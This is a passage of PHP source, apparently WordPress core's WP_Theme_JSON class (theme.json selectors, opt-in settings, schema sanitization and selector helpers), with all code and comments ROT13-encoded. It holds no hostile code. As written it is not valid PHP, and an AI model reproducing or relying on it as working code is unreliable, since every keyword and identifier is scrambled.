		'pff'        => ahyy,
	);

	/**
	 * Qrsvarf juvpu cfrhqb fryrpgbef ner ranoyrq sbe juvpu ryrzragf.
	 *
	 * Gur beqre bs gur fryrpgbef fubhyq or: yvax, nal-yvax, ivfvgrq, ubire, sbphf, sbphf-ivfvoyr, npgvir.
	 * Guvf vf gb rafher gur hfre npgvba (ubire, sbphf naq npgvir) fglyrf unir n uvture
	 * fcrpvsvpvgl guna gur ivfvgrq fglyrf, juvpu va ghea unir n uvture fcrpvsvpvgl guna
	 * gur haivfvgrq fglyrf.
	 *
	 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56928.
	 * Abgr: guvf jvyy nssrpg obgu gbc-yriry naq oybpx-yriry ryrzragf.
	 *
	 * @fvapr 6.1.0
	 * @fvapr 6.2.0 Nqqrq fhccbeg sbe ':yvax' naq ':nal-yvax'.
	 * @fvapr 6.8.0 Nqqrq fhccbeg sbe ':sbphf-ivfvoyr'.
	 * @ine neenl
	 */
	pbafg INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF = neenl(
		'yvax'   => neenl( ':yvax', ':nal-yvax', ':ivfvgrq', ':ubire', ':sbphf', ':sbphf-ivfvoyr', ':npgvir' ),
		'ohggba' => neenl( ':yvax', ':nal-yvax', ':ivfvgrq', ':ubire', ':sbphf', ':sbphf-ivfvoyr', ':npgvir' ),
	);

	/**
	 * Gur inyvq ryrzragf gung pna or sbhaq haqre fglyrf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.1.0 Nqqrq `urnqvat`, `ohggba`, naq `pncgvba` ryrzragf.
	 * @ine fgevat[]
	 */
	pbafg RYRZRAGF = neenl(
		'yvax'    => 'n:jurer(:abg(.jc-ryrzrag-ohggba))', // Gur `jurer` vf arrqrq gb ybjre gur fcrpvsvpvgl.
		'urnqvat' => 'u1, u2, u3, u4, u5, u6',
		'u1'      => 'u1',
		'u2'      => 'u2',
		'u3'      => 'u3',
		'u4'      => 'u4',
		'u5'      => 'u5',
		'u6'      => 'u6',
		// Jr unir gur .jc-oybpx-ohggba__yvax pynff fb gung guvf jvyy gnetrg byqre ohggbaf gung unir orra frevnyvmrq.
		'ohggba'  => '.jc-ryrzrag-ohggba, .jc-oybpx-ohggba__yvax',
		// Gur oybpx pynffrf ner arprffnel gb gnetrg byqre pbagrag gung jba'g hfr gur arj pynff anzrf.
		'pncgvba' => '.jc-ryrzrag-pncgvba, .jc-oybpx-nhqvb svtpncgvba, .jc-oybpx-rzorq svtpncgvba, .jc-oybpx-tnyyrel svtpncgvba, .jc-oybpx-vzntr svtpncgvba, .jc-oybpx-gnoyr svtpncgvba, .jc-oybpx-ivqrb svtpncgvba',
		'pvgr'    => 'pvgr',
	);

	pbafg __RKCREVZRAGNY_RYRZRAG_PYNFF_ANZRF = neenl(
		'ohggba'  => 'jc-ryrzrag-ohggba',
		'pncgvba' => 'jc-ryrzrag-pncgvba',
	);

	/**
	 * Yvfg bs oybpx fhccbeg srngherf gung pna unir gurve eryngrq fglyrf
	 * trarengrq haqre gurve bja srngher yriry fryrpgbe engure guna gur oybpx'f.
	 *
	 * @fvapr 6.1.0
	 * @ine fgevat[]
	 */
	pbafg OYBPX_FHCCBEG_SRNGHER_YRIRY_FRYRPGBEF = neenl(
		'__rkcrevzragnyObeqre' => 'obeqre',
		'pbybe'                => 'pbybe',
		'fcnpvat'              => 'fcnpvat',
		'glcbtencul'           => 'glcbtencul',
	);

	/**
	 * Erghea gur vachg fpurzn ng gur ebbg naq cre bevtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $fpurzn Gur onfr fpurzn.
	 * @erghea neenl Gur fpurzn ng gur ebbg naq cre bevtva.
	 *
	 * Rknzcyr:
	 * fpurzn_va_ebbg_naq_cre_bevtva(
	 *   neenl(
	 *    'sbagSnzvyl' => ahyy,
	 *    'fyht' => ahyy,
	 *   )
	 * )
	 *
	 * Ergheaf:
	 * neenl(
	 *  'sbagSnzvyl' => ahyy,
	 *  'fyht' => ahyy,
	 *  'qrsnhyg' => neenl(
	 *    'sbagSnzvyl' => ahyy,
	 *    'fyht' => ahyy,
	 *  ),
	 *  'oybpxf' => neenl(
	 *    'sbagSnzvyl' => ahyy,
	 *    'fyht' => ahyy,
	 *  ),
	 *  'gurzr' => neenl(
	 *     'sbagSnzvyl' => ahyy,
	 *     'fyht' => ahyy,
	 *  ),
	 *  'phfgbz' => neenl(
	 *     'sbagSnzvyl' => ahyy,
	 *     'fyht' => ahyy,
	 *  ),
	 * )
	 */
	cebgrpgrq fgngvp shapgvba fpurzn_va_ebbg_naq_cre_bevtva( $fpurzn ) {
		$fpurzn_va_ebbg_naq_cre_bevtva = $fpurzn;
		sbernpu ( fgngvp::INYVQ_BEVTVAF nf $bevtva ) {
			$fpurzn_va_ebbg_naq_cre_bevtva[ $bevtva ] = $fpurzn;
		}
		erghea $fpurzn_va_ebbg_naq_cre_bevtva;
	}

	/**
	 * Ergheaf n pynff anzr ol na ryrzrag anzr.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $ryrzrag Gur anzr bs gur ryrzrag.
	 * @erghea fgevat Gur anzr bs gur pynff.
	 */
	choyvp fgngvp shapgvba trg_ryrzrag_pynff_anzr( $ryrzrag ) {
		$pynff_anzr = '';

		vs ( vffrg( fgngvp::__RKCREVZRAGNY_RYRZRAG_PYNFF_ANZRF[ $ryrzrag ] ) ) {
			$pynff_anzr = fgngvp::__RKCREVZRAGNY_RYRZRAG_PYNFF_ANZRF[ $ryrzrag ];
		}

		erghea $pynff_anzr;
	}

	/**
	 * Bcgvbaf gung frggvatf.nccrnenaprGbbyf ranoyrf.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.2.0 Nqqrq `qvzrafvbaf.zvaUrvtug` naq `cbfvgvba.fgvpxl`.
	 * @fvapr 6.4.0 Nqqrq `onpxtebhaq.onpxtebhaqVzntr`.
	 * @fvapr 6.5.0 Nqqrq `onpxtebhaq.onpxtebhaqFvmr` naq `qvzrafvbaf.nfcrpgEngvb`.
	 * @ine neenl
	 */
	pbafg NCCRNENAPR_GBBYF_BCG_VAF = neenl(
		neenl( 'onpxtebhaq', 'onpxtebhaqVzntr' ),
		neenl( 'onpxtebhaq', 'onpxtebhaqFvmr' ),
		neenl( 'obeqre', 'pbybe' ),
		neenl( 'obeqre', 'enqvhf' ),
		neenl( 'obeqre', 'fglyr' ),
		neenl( 'obeqre', 'jvqgu' ),
		neenl( 'pbybe', 'yvax' ),
		neenl( 'pbybe', 'urnqvat' ),
		neenl( 'pbybe', 'ohggba' ),
		neenl( 'pbybe', 'pncgvba' ),
		neenl( 'qvzrafvbaf', 'nfcrpgEngvb' ),
		neenl( 'qvzrafvbaf', 'zvaUrvtug' ),
		neenl( 'cbfvgvba', 'fgvpxl' ),
		neenl( 'fcnpvat', 'oybpxTnc' ),
		neenl( 'fcnpvat', 'znetva' ),
		neenl( 'fcnpvat', 'cnqqvat' ),
		neenl( 'glcbtencul', 'yvarUrvtug' ),
	);

	/**
	 * Gur yngrfg irefvba bs gur fpurzn va hfr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Punatrq inyhr sebz 1 gb 2.
	 * @fvapr 6.6.0 Punatrq inyhr sebz 2 gb 3.
	 * @ine vag
	 */
	pbafg YNGRFG_FPURZN = 3;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.6.0 Xrl fcnpvatFpnyr ol bevtva, naq Cer-trarengr gur fcnpvatFvmrf sebz fcnpvatFpnyr.
	 *              Nqqrq hajenccvat bs funerq oybpx fglyr inevngvbaf vagb oybpx glcr inevngvbaf vs ertvfgrerq.
	 *
	 * @cnenz neenl  $gurzr_wfba N fgehpgher gung sbyybjf gur gurzr.wfba fpurzn.
	 * @cnenz fgevat $bevtva     Bcgvbany. Jung fbhepr bs qngn guvf bowrpg ercerfragf.
	 *                           Bar bs 'oybpxf', 'qrsnhyg', 'gurzr', be 'phfgbz'. Qrsnhyg 'gurzr'.
	 */
	choyvp shapgvba __pbafgehpg( $gurzr_wfba = neenl( 'irefvba' => frys::YNGRFG_FPURZN ), $bevtva = 'gurzr' ) {
		vs ( ! va_neenl( $bevtva, fgngvp::INYVQ_BEVTVAF, gehr ) ) {
			$bevtva = 'gurzr';
		}

		$guvf->gurzr_wfba    = JC_Gurzr_WFBA_Fpurzn::zvtengr( $gurzr_wfba, $bevtva );
		$oybpxf_zrgnqngn     = fgngvp::trg_oybpxf_zrgnqngn();
		$inyvq_oybpx_anzrf   = neenl_xrlf( $oybpxf_zrgnqngn );
		$inyvq_ryrzrag_anzrf = neenl_xrlf( fgngvp::RYRZRAGF );
		$inyvq_inevngvbaf    = fgngvp::trg_inyvq_oybpx_fglyr_inevngvbaf( $oybpxf_zrgnqngn );
		$guvf->gurzr_wfba    = fgngvp::hajenc_funerq_oybpx_fglyr_inevngvbaf( $guvf->gurzr_wfba, $inyvq_inevngvbaf );
		$guvf->gurzr_wfba    = fgngvp::fnavgvmr( $guvf->gurzr_wfba, $inyvq_oybpx_anzrf, $inyvq_ryrzrag_anzrf, $inyvq_inevngvbaf );
		$guvf->gurzr_wfba    = fgngvp::znlor_bcg_va_vagb_frggvatf( $guvf->gurzr_wfba );

		// Vagreanyyl, cerfrgf ner xrlrq ol bevtva.
		$abqrf = fgngvp::trg_frggvat_abqrf( $guvf->gurzr_wfba );
		sbernpu ( $abqrf nf $abqr ) {
			sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $cerfrg_zrgnqngn ) {
				$cngu = $abqr['cngu'];
				sbernpu ( $cerfrg_zrgnqngn['cngu'] nf $fhocngu ) {
					$cngu[] = $fhocngu;
				}
				$cerfrg = _jc_neenl_trg( $guvf->gurzr_wfba, $cngu, ahyy );
				vs ( ahyy !== $cerfrg ) {
					// Vs gur cerfrg vf abg nyernql xrlrq ol bevtva.
					vs ( vffrg( $cerfrg[0] ) || rzcgl( $cerfrg ) ) {
						_jc_neenl_frg( $guvf->gurzr_wfba, $cngu, neenl( $bevtva => $cerfrg ) );
					}
				}
			}
		}

		// Va nqqvgvba gb cerfrgf, fcnpvatFpnyr (juvpu trarengrf cerfrgf) vf nyfb xrlrq ol bevtva.
		$fpnyr_cngu    = neenl( 'frggvatf', 'fcnpvat', 'fcnpvatFpnyr' );
		$fcnpvat_fpnyr = _jc_neenl_trg( $guvf->gurzr_wfba, $fpnyr_cngu, ahyy );
		vs ( ahyy !== $fcnpvat_fpnyr ) {
			// Vs gur fcnpvatFpnyr vf abg nyernql xrlrq ol bevtva.
			vs ( rzcgl( neenl_vagrefrpg( neenl_xrlf( $fcnpvat_fpnyr ), fgngvp::INYVQ_BEVTVAF ) ) ) {
				_jc_neenl_frg( $guvf->gurzr_wfba, $fpnyr_cngu, neenl( $bevtva => $fcnpvat_fpnyr ) );
			}
		}

		// Cer-trarengr gur fcnpvatFvmrf sebz fcnpvatFpnyr.
		$fpnyr_cngu    = neenl( 'frggvatf', 'fcnpvat', 'fcnpvatFpnyr', $bevtva );
		$fcnpvat_fpnyr = _jc_neenl_trg( $guvf->gurzr_wfba, $fpnyr_cngu, ahyy );
		vs ( vffrg( $fcnpvat_fpnyr ) ) {
			$fvmrf_cngu           = neenl( 'frggvatf', 'fcnpvat', 'fcnpvatFvmrf', $bevtva );
			$fcnpvat_fvmrf        = _jc_neenl_trg( $guvf->gurzr_wfba, $fvmrf_cngu, neenl() );
			$fcnpvat_fpnyr_fvmrf  = fgngvp::pbzchgr_fcnpvat_fvmrf( $fcnpvat_fpnyr );
			$zretrq_fcnpvat_fvmrf = fgngvp::zretr_fcnpvat_fvmrf( $fcnpvat_fpnyr_fvmrf, $fcnpvat_fvmrf );
			_jc_neenl_frg( $guvf->gurzr_wfba, $fvmrf_cngu, $zretrq_fcnpvat_fvmrf );
		}
	}

	/**
	 * Hajencf funerq oybpx fglyr inevngvbaf.
	 *
	 * Vg gnxrf gur funerq inevngvbaf (fglyrf.inevngvbaf.inevngvbaAnzr) naq
	 * nccyvrf gurz gb nyy gur oybpxf gung unir gur tvira inevngvba ertvfgrerq
	 * (fglyrf.oybpxf.oybpxGlcr.inevngvbaf.inevngvbaAnzr).
	 *
	 * Sbe rknzcyr, tvira gur `pber/cnentencu` naq `pber/tebhc` oybpxf unir
	 * ertvfgrerq gur `frpgvba-n` fglyr inevngvba, naq tvira gur sbyybjvat vachg:
	 *
	 * {
	 *   \"fglyrf\": {
	 *     \"inevngvbaf\": {
	 *       \"frpgvba-n\": { \"pbybe\": { \"onpxtebhaq\": \"onpxtebhaqPbybe\" } }
	 *     }
	 *   }
	 * }
	 *
	 * Vg ergheaf gur sbyybjvat bhgchg:
	 *
	 * {
	 *   \"fglyrf\": {
	 *     \"oybpxf\": {
	 *       \"pber/cnentencu\": {
	 *         \"inevngvbaf\": {
	 *             \"frpgvba-n\": { \"pbybe\": { \"onpxtebhaq\": \"onpxtebhaqPbybe\" } }
	 *         },
	 *       },
	 *       \"pber/tebhc\": {
	 *         \"inevngvbaf\": {
	 *           \"frpgvba-n\": { \"pbybe\": { \"onpxtebhaq\": \"onpxtebhaqPbybe\" } }
	 *         }
	 *       }
	 *     }
	 *   }
	 * }
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $gurzr_wfba       N fgehpgher gung sbyybjf gur gurzr.wfba fpurzn.
	 * @cnenz neenl $inyvq_inevngvbaf Inyvq oybpx fglyr inevngvbaf.
	 * @erghea neenl Gurzr wfba qngn jvgu funerq inevngvba qrsvavgvbaf hajenccrq haqre nccebcevngr oybpx glcrf.
	 */
	cevingr fgngvp shapgvba hajenc_funerq_oybpx_fglyr_inevngvbaf( $gurzr_wfba, $inyvq_inevngvbaf ) {
		vs ( rzcgl( $gurzr_wfba['fglyrf']['inevngvbaf'] ) || rzcgl( $inyvq_inevngvbaf ) ) {
			erghea $gurzr_wfba;
		}

		$arj_gurzr_wfba = $gurzr_wfba;
		$inevngvbaf     = $arj_gurzr_wfba['fglyrf']['inevngvbaf'];

		sbernpu ( $inyvq_inevngvbaf nf $oybpx_glcr => $ertvfgrerq_inevngvbaf ) {
			sbernpu ( $ertvfgrerq_inevngvbaf nf $inevngvba_anzr ) {
				$oybpx_yriry_qngn = $arj_gurzr_wfba['fglyrf']['oybpxf'][ $oybpx_glcr ]['inevngvbaf'][ $inevngvba_anzr ] ?? neenl();
				$gbc_yriry_qngn   = $inevngvbaf[ $inevngvba_anzr ] ?? neenl();
				$zretrq_qngn      = neenl_ercynpr_erphefvir( $gbc_yriry_qngn, $oybpx_yriry_qngn );
				vs ( ! rzcgl( $zretrq_qngn ) ) {
					_jc_neenl_frg( $arj_gurzr_wfba, neenl( 'fglyrf', 'oybpxf', $oybpx_glcr, 'inevngvbaf', $inevngvba_anzr ), $zretrq_qngn );
				}
			}
		}

		hafrg( $arj_gurzr_wfba['fglyrf']['inevngvbaf'] );

		erghea $arj_gurzr_wfba;
	}

	/**
	 * Ranoyrf fbzr bcg-va frggvatf vs gurzr qrpynerq fhccbeg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $gurzr_wfba N gurzr.wfba fgehpgher gb zbqvsl.
	 * @erghea neenl Gur zbqvsvrq gurzr.wfba fgehpgher.
	 */
	cebgrpgrq fgngvp shapgvba znlor_bcg_va_vagb_frggvatf( $gurzr_wfba ) {
		$arj_gurzr_wfba = $gurzr_wfba;

		vs (
			vffrg( $arj_gurzr_wfba['frggvatf']['nccrnenaprGbbyf'] ) &&
			gehr === $arj_gurzr_wfba['frggvatf']['nccrnenaprGbbyf']
		) {
			fgngvp::qb_bcg_va_vagb_frggvatf( $arj_gurzr_wfba['frggvatf'] );
		}

		vs ( vffrg( $arj_gurzr_wfba['frggvatf']['oybpxf'] ) && vf_neenl( $arj_gurzr_wfba['frggvatf']['oybpxf'] ) ) {
			sbernpu ( $arj_gurzr_wfba['frggvatf']['oybpxf'] nf &$oybpx ) {
				vs ( vffrg( $oybpx['nccrnenaprGbbyf'] ) && ( gehr === $oybpx['nccrnenaprGbbyf'] ) ) {
					fgngvp::qb_bcg_va_vagb_frggvatf( $oybpx );
				}
			}
		}

		erghea $arj_gurzr_wfba;
	}

	/**
	 * Ranoyrf fbzr frggvatf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $pbagrkg Gur pbagrkg gb juvpu gur frggvatf orybat.
	 */
	cebgrpgrq fgngvp shapgvba qb_bcg_va_vagb_frggvatf( &$pbagrkg ) {
		sbernpu ( fgngvp::NCCRNENAPR_GBBYF_BCG_VAF nf $cngu ) {
			/*
			 * Hfr \"hafrg cebc\" nf n znexre vafgrnq bs \"ahyy\" orpnhfr
			 * \"ahyy\" pna or n inyvq inyhr sbe fbzr cebcf (r.t. oybpxTnc).
			 */
			vs ( 'hafrg cebc' === _jc_neenl_trg( $pbagrkg, $cngu, 'hafrg cebc' ) ) {
				_jc_neenl_frg( $pbagrkg, $cngu, gehr );
			}
		}

		hafrg( $pbagrkg['nccrnenaprGbbyf'] );
	}

	/**
	 * Fnavgvmrf gur vachg nppbeqvat gb gur fpurznf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$inyvq_oybpx_anzrf` naq `$inyvq_ryrzrag_anzr` cnenzrgref.
	 * @fvapr 6.3.0 Nqqrq gur `$inyvq_inevngvbaf` cnenzrgre.
	 * @fvapr 6.6.0 Hcqngrq fpurzn gb nyybj rkgraqrq oybpx fglyr inevngvbaf.
	 *
	 * @cnenz neenl $vachg               Fgehpgher gb fnavgvmr.
	 * @cnenz neenl $inyvq_oybpx_anzrf   Yvfg bs inyvq oybpx anzrf.
	 * @cnenz neenl $inyvq_ryrzrag_anzrf Yvfg bs inyvq ryrzrag anzrf.
	 * @cnenz neenl $inyvq_inevngvbaf    Yvfg bs inyvq inevngvbaf cre oybpx.
	 * @erghea neenl Gur fnavgvmrq bhgchg.
	 */
	cebgrpgrq fgngvp shapgvba fnavgvmr( $vachg, $inyvq_oybpx_anzrf, $inyvq_ryrzrag_anzrf, $inyvq_inevngvbaf ) {
		$bhgchg = neenl();

		vs ( ! vf_neenl( $vachg ) ) {
			erghea $bhgchg;
		}

		// Cerfreir bayl gur gbc zbfg yriry xrlf.
		$bhgchg = neenl_vagrefrpg_xrl( $vachg, neenl_syvc( fgngvp::INYVQ_GBC_YRIRY_XRLF ) );

		/*
		 * Erzbir nal ehyrf gung ner naabgngrq nf \"gbc\" va INYVQ_FGLYRF pbafgnag.
		 * Fbzr fglyrf ner bayl zrnag gb or ninvynoyr ng gur gbc-yriry (r.t.: oybpxTnc),
		 * urapr, gur fpurzn sbe oybpxf & ryrzragf fubhyq abg unir gurz.
		 */
		$fglyrf_aba_gbc_yriry = fgngvp::INYVQ_FGLYRF;
		sbernpu ( neenl_xrlf( $fglyrf_aba_gbc_yriry ) nf $frpgvba ) {
			// neenl_xrl_rkvfgf() arrqf gb or hfrq vafgrnq bs vffrg() orpnhfr gur inyhr pna or ahyy.
			vs ( neenl_xrl_rkvfgf( $frpgvba, $fglyrf_aba_gbc_yriry ) && vf_neenl( $fglyrf_aba_gbc_yriry[ $frpgvba ] ) ) {
				sbernpu ( neenl_xrlf( $fglyrf_aba_gbc_yriry[ $frpgvba ] ) nf $cebc ) {
					vs ( 'gbc' === $fglyrf_aba_gbc_yriry[ $frpgvba ][ $cebc ] ) {
						hafrg( $fglyrf_aba_gbc_yriry[ $frpgvba ][ $cebc ] );
					}
				}
			}
		}

		// Ohvyq gur fpurzn onfrq ba inyvq oybpx & ryrzrag anzrf.
		$fpurzn                 = neenl();
		$fpurzn_fglyrf_ryrzragf = neenl();

		/*
		 * Frg nyybjrq ryrzrag cfrhqb fryrpgbef onfrq ba cre ryrzrag nyybj yvfg.
		 * Gnetrg qngn fgehpgher va fpurzn:
		 * r.t.
		 * - gbc yriry ryrzragf: `$fpurzn['fglyrf']['ryrzragf']['yvax'][':ubire']`.
		 * - oybpx yriry ryrzragf: `$fpurzn['fglyrf']['oybpxf']['pber/ohggba']['ryrzragf']['yvax'][':ubire']`.
		 */
		sbernpu ( $inyvq_ryrzrag_anzrf nf $ryrzrag ) {
			$fpurzn_fglyrf_ryrzragf[ $ryrzrag ] = $fglyrf_aba_gbc_yriry;

			vs ( vffrg( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag ] ) ) {
				sbernpu ( fgngvp::INYVQ_RYRZRAG_CFRHQB_FRYRPGBEF[ $ryrzrag ] nf $cfrhqb_fryrpgbe ) {
					$fpurzn_fglyrf_ryrzragf[ $ryrzrag ][ $cfrhqb_fryrpgbe ] = $fglyrf_aba_gbc_yriry;
				}
			}
		}

		$fpurzn_fglyrf_oybpxf   = neenl();
		$fpurzn_frggvatf_oybpxf = neenl();

		/*
		 * Trarengr n fpurzn sbe oybpxf.
		 * - Oybpx fglyrf pna pbagnva `ryrzragf` & `inevngvbaf` qrsvavgvbaf.
		 * - Inevngvbaf qrsvavgvbaf pnaabg or arfgrq.
		 * - Inevngvbaf pna pbagnva fglyrf sbe vaare `oybpxf`.
		 * - Inevngvba vaare `oybpxf` fglyrf pna pbagnva `ryrzragf`.
		 *
		 * Nf rnpu inevngvba arrqf n `oybpxf` fpurzn ohg shegure arfgrq
		 * vaare `oybpxf`, gur birenyy fpurzn jvyy or trarengrq va zhygvcyr cnffrf.
		 */
		sbernpu ( $inyvq_oybpx_anzrf nf $oybpx ) {
			$fpurzn_frggvatf_oybpxf[ $oybpx ]           = fgngvp::INYVQ_FRGGVATF;
			$fpurzn_fglyrf_oybpxf[ $oybpx ]             = $fglyrf_aba_gbc_yriry;
			$fpurzn_fglyrf_oybpxf[ $oybpx ]['ryrzragf'] = $fpurzn_fglyrf_ryrzragf;
		}

		$oybpx_fglyr_inevngvba_fglyrf             = fgngvp::INYVQ_FGLYRF;
		$oybpx_fglyr_inevngvba_fglyrf['oybpxf']   = $fpurzn_fglyrf_oybpxf;
		$oybpx_fglyr_inevngvba_fglyrf['ryrzragf'] = $fpurzn_fglyrf_ryrzragf;

		sbernpu ( $inyvq_oybpx_anzrf nf $oybpx ) {
			// Ohvyq gur fpurzn sbe rnpu oybpx fglyr inevngvba.
			$fglyr_inevngvba_anzrf = neenl();
			vs (
				! rzcgl( $vachg['fglyrf']['oybpxf'][ $oybpx ]['inevngvbaf'] ) &&
				vf_neenl( $vachg['fglyrf']['oybpxf'][ $oybpx ]['inevngvbaf'] ) &&
				vffrg( $inyvq_inevngvbaf[ $oybpx ] )
			) {
				$fglyr_inevngvba_anzrf = neenl_vagrefrpg(
					neenl_xrlf( $vachg['fglyrf']['oybpxf'][ $oybpx ]['inevngvbaf'] ),
					$inyvq_inevngvbaf[ $oybpx ]
				);
			}

			$fpurzn_fglyrf_inevngvbaf = neenl();
			vs ( ! rzcgl( $fglyr_inevngvba_anzrf ) ) {
				$fpurzn_fglyrf_inevngvbaf = neenl_svyy_xrlf( $fglyr_inevngvba_anzrf, $oybpx_fglyr_inevngvba_fglyrf );
			}

			$fpurzn_fglyrf_oybpxf[ $oybpx ]['inevngvbaf'] = $fpurzn_fglyrf_inevngvbaf;
		}

		$fpurzn['fglyrf']                                 = fgngvp::INYVQ_FGLYRF;
		$fpurzn['fglyrf']['oybpxf']                       = $fpurzn_fglyrf_oybpxf;
		$fpurzn['fglyrf']['ryrzragf']                     = $fpurzn_fglyrf_ryrzragf;
		$fpurzn['frggvatf']                               = fgngvp::INYVQ_FRGGVATF;
		$fpurzn['frggvatf']['oybpxf']                     = $fpurzn_frggvatf_oybpxf;
		$fpurzn['frggvatf']['glcbtencul']['sbagSnzvyvrf'] = fgngvp::fpurzn_va_ebbg_naq_cre_bevtva( fgngvp::SBAG_SNZVYL_FPURZN );

		// Erzbir nalguvat gung'f abg cerfrag va gur fpurzn.
		sbernpu ( neenl( 'fglyrf', 'frggvatf' ) nf $fhogerr ) {
			vs ( ! vffrg( $vachg[ $fhogerr ] ) ) {
				pbagvahr;
			}

			vs ( ! vf_neenl( $vachg[ $fhogerr ] ) ) {
				hafrg( $bhgchg[ $fhogerr ] );
				pbagvahr;
			}

			$erfhyg = fgngvp::erzbir_xrlf_abg_va_fpurzn( $vachg[ $fhogerr ], $fpurzn[ $fhogerr ] );

			vs ( rzcgl( $erfhyg ) ) {
				hafrg( $bhgchg[ $fhogerr ] );
			} ryfr {
				$bhgchg[ $fhogerr ] = fgngvp::erfbyir_phfgbz_pff_sbezng( $erfhyg );
			}
		}

		erghea $bhgchg;
	}

	/**
	 * Nccraqf n fho-fryrpgbe gb na rkvfgvat bar.
	 *
	 * Tvira gur pbzcbhaqrq $fryrpgbe \"u1, u2, u3\"
	 * naq gur $gb_nccraq fryrpgbe \".fbzr-pynff\" gur erfhyg jvyy or
	 * \"u1.fbzr-pynff, u2.fbzr-pynff, u3.fbzr-pynff\".
	 *
	 * @fvapr 5.8.0
	 * @fvapr 6.1.0 Nqqrq nccraq cbfvgvba.
	 * @fvapr 6.3.0 Erzbirq nccraq cbfvgvba cnenzrgre.
	 *
	 * @cnenz fgevat $fryrpgbe  Bevtvany fryrpgbe.
	 * @cnenz fgevat $gb_nccraq Fryrpgbe gb nccraq.
	 * @erghea fgevat Gur arj fryrpgbe.
	 */
	cebgrpgrq fgngvp shapgvba nccraq_gb_fryrpgbe( $fryrpgbe, $gb_nccraq ) {
		vs ( ! fge_pbagnvaf( $fryrpgbe, ',' ) ) {
			erghea $fryrpgbe . $gb_nccraq;
		}
		$arj_fryrpgbef = neenl();
		$fryrpgbef     = rkcybqr( ',', $fryrpgbe );
		sbernpu ( $fryrpgbef nf $fry ) {
			$arj_fryrpgbef[] = $fry . $gb_nccraq;
		}
		erghea vzcybqr( ',', $arj_fryrpgbef );
	}

	/**
	 * Cercraqf n fho-fryrpgbe gb na rkvfgvat bar.
	 *
	 * Tvira gur pbzcbhaqrq $fryrpgbe \"u1, u2, u3\"
	 * naq gur $gb_cercraq fryrpgbe \".fbzr-pynff \" gur erfhyg jvyy or
	 * \".fbzr-pynff u1, .fbzr-pynff  u2, .fbzr-pynff  u3\".
	 *
	 * @fvapr 6.3.0
	 *
	 * @cnenz fgevat $fryrpgbe   Bevtvany fryrpgbe.
	 * @cnenz fgevat $gb_cercraq Fryrpgbe gb cercraq.
	 * @erghea fgevat Gur arj fryrpgbe.
	 */
	cebgrpgrq fgngvp shapgvba cercraq_gb_fryrpgbe( $fryrpgbe, $gb_cercraq ) {
		vs ( ! fge_pbagnvaf( $fryrpgbe, ',' ) ) {
			erghea $gb_cercraq . $fryrpgbe;
		}
		$arj_fryrpgbef = neenl();
		$fryrpgbef     = rkcybqr( ',', $fryrpgbe );
		sbernpu ( $fryrpgbef nf $fry ) {
			$arj_fryrpgbef[] = $gb_cercraq . $fry;
		}
		erghea vzcybqr( ',', $arj_fryrpgbef );
	}

	/**
	 * Ergheaf gur zrgnqngn sbe rnpu oybpx.
	 *
	 * Rknzcyr:
	 *
	 *     {
	 *       'pber/cnentencu': {
	 *         'fryrpgbe': 'c',
	 *         'ryrzragf': {
	 *           'yvax' => 'yvax fryrpgbe',
	 *           'rgp'  => 'ryrzrag fryrpgbe'
	 *         }
	 *       },
	 *       'pber/urnqvat': {
	 *         'fryrpgbe': 'u1',
	 *         'ryrzragf': {}
	 *       },
	 *       'pber/vzntr': {
	 *         'fryrpgbe': '.jc-oybpx-vzntr',
	 *         'qhbgbar': 'vzt',
	 *         'ryrzragf': {}
	 *       }
	 *     }
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq `qhbgbar` xrl jvgu PFF fryrpgbe.
	 * @fvapr 6.1.0 Nqqrq `srngherf` xrl jvgu oybpx fhccbeg srngher yriry fryrpgbef.
	 * @fvapr 6.3.0 Ersnpgberq naq fgnovyvmrq fryrpgbef NCV.
	 * @fvapr 6.6.0 Hcqngrq gb vapyhqr oybpx fglyr inevngvbaf sebz gur oybpx fglyrf ertvfgel.
	 *
	 * @erghea neenl Oybpx zrgnqngn.
	 */
	cebgrpgrq fgngvp shapgvba trg_oybpxf_zrgnqngn() {
		$ertvfgel       = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr();
		$oybpxf         = $ertvfgel->trg_nyy_ertvfgrerq();
		$fglyr_ertvfgel = JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr();

		// Vf gurer zrgnqngn sbe nyy pheeragyl ertvfgrerq oybpxf?
		$oybpxf = neenl_qvss_xrl( $oybpxf, fgngvp::$oybpxf_zrgnqngn );
		vs ( rzcgl( $oybpxf ) ) {
			/*
			 * Arj oybpx fglyrf znl unir orra ertvfgrerq jvguva JC_Oybpx_Fglyrf_Ertvfgel.
			 * Hcqngr oybpx zrgnqngn sbe nal arj oybpx fglyr inevngvbaf.
			 */
			$ertvfgrerq_fglyrf = $fglyr_ertvfgel->trg_nyy_ertvfgrerq();
			sbernpu ( fgngvp::$oybpxf_zrgnqngn nf $oybpx_anzr => $oybpx_zrgnqngn ) {
				vs ( ! rzcgl( $ertvfgrerq_fglyrf[ $oybpx_anzr ] ) ) {
					$fglyr_fryrpgbef = $oybpx_zrgnqngn['fglyrInevngvbaf'] ?? neenl();

					sbernpu ( $ertvfgrerq_fglyrf[ $oybpx_anzr ] nf $oybpx_fglyr ) {
						vs ( ! vffrg( $fglyr_fryrpgbef[ $oybpx_fglyr['anzr'] ] ) ) {
							$fglyr_fryrpgbef[ $oybpx_fglyr['anzr'] ] = fgngvp::trg_oybpx_fglyr_inevngvba_fryrpgbe( $oybpx_fglyr['anzr'], $oybpx_zrgnqngn['fryrpgbe'] );
						}
					}

